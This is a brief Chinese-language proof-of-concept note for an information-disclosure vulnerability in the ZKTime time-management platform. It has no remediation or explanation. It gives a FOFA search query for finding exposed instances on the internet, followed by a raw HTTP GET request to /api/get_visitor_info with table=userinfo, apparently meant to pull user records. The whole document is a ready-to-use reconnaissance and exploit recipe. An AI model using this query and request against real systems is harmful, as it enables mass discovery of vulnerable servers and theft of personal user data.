ZKTime时间精细化管理平台 get\_visitor\_info 存在信息泄露​



fofa

body="/media/img/login/zktime\_logo\_zh-cn.png" \&\& body="/iclock/imanager"​



poc

GET /api/get\_visitor\_info?table=userinfo HTTP/1.1

Host: 

Upgrade-Insecure-Requests: 1

Accept-Encoding: gzip, deflate

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

